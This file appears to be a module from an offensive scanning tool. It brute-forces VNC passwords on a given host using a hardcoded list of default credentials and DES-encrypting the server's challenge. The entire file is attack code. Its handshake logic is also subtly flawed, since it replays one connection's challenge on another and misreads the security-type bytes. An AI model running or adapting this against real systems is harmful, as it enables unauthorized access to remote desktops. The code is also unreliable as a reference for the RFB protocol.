# modules/des_brute.py

import socket
from Crypto.Cipher import DES
import itertools

# Default creds often used in VNC setups
COMMON_PASSWORDS = [
    "admin", "password", "123456", "vnc", "qwerty", "root", "1"
]

def vnc_encrypt(challenge, password):
    # Pad password to 8 bytes, reverse bits
    pw = password.ljust(8, "\x00")[:8]
    pw = bytes([int('{:08b}'.format(b)[::-1], 2) for b in pw.encode()])
    cipher = DES.new(pw, DES.MODE_ECB)
    return cipher.encrypt(challenge)

def check(ip, port):
    try:
        s = socket.create_connection((ip, port), timeout=5)
        s.recv(12)                         # banner
        s.sendall(b"RFB 003.008\n")        # version
        sec_types = s.recv(1)
        if sec_types == b"\x02":
            # DES challenge expected
            challenge = s.recv(16)
            for pwd in COMMON_PASSWORDS:
                response = vnc_encrypt(challenge, pwd)
                s2 = socket.create_connection((ip, port), timeout=5)
                s2.recv(12)
                s2.sendall(b"RFB 003.008\n")
                s2.recv(1)
                s2.send(response)
                result = s2.recv(4)
                if result == b"\x00\x00\x00\x00":  # auth OK
                    print(f"      [+] Password found: '{pwd}'")
                    return True
        s.close()
    except Exception:
        return False
    return False

def exploit(ip, port):
    print(f"      [!] Weak DES login — connect using cracked password from above.")
